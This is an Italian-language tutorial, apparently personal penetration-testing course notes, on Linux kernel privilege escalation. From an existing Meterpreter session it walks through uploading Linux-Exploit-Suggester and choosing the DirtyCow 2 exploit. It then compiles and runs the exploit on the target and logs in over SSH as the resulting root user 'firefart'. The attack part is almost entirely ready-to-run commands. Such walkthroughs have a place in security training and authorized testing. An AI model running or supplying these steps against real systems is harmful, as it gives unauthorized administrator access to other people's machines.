Gli exploit del kernel su Linux **mirano** tipicamente alle vulnerabilità ****del **kernel** Linux
per **eseguire codice arbitrario** al fine di eseguire comandi di sistema privilegiati **o**
**ottenere** una **shell** di sistema.

- Questo processo varia **in base alla versione e alla distribuzione** del kernel presa di
mira **e all'exploit del kernel utilizzato**.
- L'escalation dei privilegi sui sistemi Linux segue in genere la seguente
**metodologia**:
    - **Identificazione** delle **vulnerabilità** del kernel
    - **Scaricare**, **compilare** e **trasferire** gli **exploit** **del kernel sul sistema** di
    **destinazione**.

UTILIZZEREMO UN TOOL PER RILEVARE VULNERABILITA’ NEL KERNEL

**Linux-Exploit-Suggester** è stato progettato per aiutare a rilevare le carenze di sicurezza di un determinato kernel Linux o di una macchina basata su Linux. Valuta l'esposizione del kernel dato a ogni exploit del kernel Linux pubblicamente noto.

- GitHub: https://github.com/mzet-/linux-exploit-suggester

EXPLOIT

1. GitHub: https://github.com/mzet-/linux-exploit-suggester
    - quick download
2. Dobbiamo avere una sessione Meterpreter sul target
3. **cd /tmp** ci mettiamo nella cartella dei file temporanei
4. **updload /PATH/les.sh** carichiamo il tools sul target linux
5. **shell**
6. **/bin/bash -i** ci serve questa shell per dare il permesso di esecuzione
7. **chmod +x les.sh**
8. **./les.sh** 
9. troviamo l’exploit da utilizzare in base a:
    1. **exposure** deve essere alta
    2. **tags** match con la versione
10. nel nostro esempio utilizziamo **DirtyCow 2**
11. **scarichiamo sul nostro pc** dal link che ci viene fornito dal tool
12. **sudo apt-get install gcc** scarichiamo gcc per compilare l’exploit DirtyCow
13. **mv EXPLOIT dirty.c** dobbiamo rinominare l’exploit in **dirty.c**

ORA POSSIAMO **compilarlo** DIRETTAMENTE SUL **PC TARGET** **OPPURE** SUL **NOSTRO PC**

-direttamente sul target (piu efficave)

1. **exit** chiudiamo la sessione shell e torniamo sulla sessione meterpreter
2. **updload /PATH/dirty.c**
3. **shell**
4. **/bin/bash -i**
5. **gcc -pthread dirty.c -o dirty -lcrypt** complila il file in binario (Comando trovabile nell istruzioni del download)
6. **chmod +x dirty**  
7. **./dirty password123** la password credo sia casuale o verificare sul link exploit

su un altro terminale 

1. **ssh firefart@IP_TARGET**
2. **remove whit**: copiamo and incolliamo il comando per rimuovere la chiave
3. **ssh firefart@IP_TARGET** nuovamente proviamo ad accedere con la password password123
4. siamo dentro come amministratore

-dal nostro PC

1. **gcc -pthread dirty.c -o dirty -lcrypt** complila il file in binario (Comando trovabile nell istruzioni del download) **(su un altro terminale)**
2. **exit** chiudiamo la sessione shell e torniamo sulla sessione meterpreter
3. **updload /PATH/dirty**
4. **shell**
5. **/bin/bash -i**
6. **chmod +x dirty**  
7. **./dirty password123** la password credo sia casuale o verificare sul link exploit
